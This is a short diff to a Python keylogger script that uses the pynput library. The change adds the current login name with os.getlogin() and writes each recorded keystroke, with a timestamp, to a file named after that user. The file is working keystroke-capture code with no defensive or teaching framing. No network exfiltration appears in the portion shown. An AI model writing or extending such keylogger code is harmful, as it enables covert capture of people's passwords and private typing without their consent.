@@ -1,12 +1,14 @@
 from pynput import keyboard
 import time
+import os
 
+username = os.getlogin()
 t = time.localtime()
 
 count, keys = 0, []
 
 def log_2_file(keys):
-    with open("keylogger.txt", "a") as log_file:
+    with open((username) + " keylogger.txt", "a") as log_file:
         for key in keys:
             log_file.write("Date and time: " + time.asctime(t) + " " + "Key Pressed: " + str(key) + "\n")
             log_file.flush()
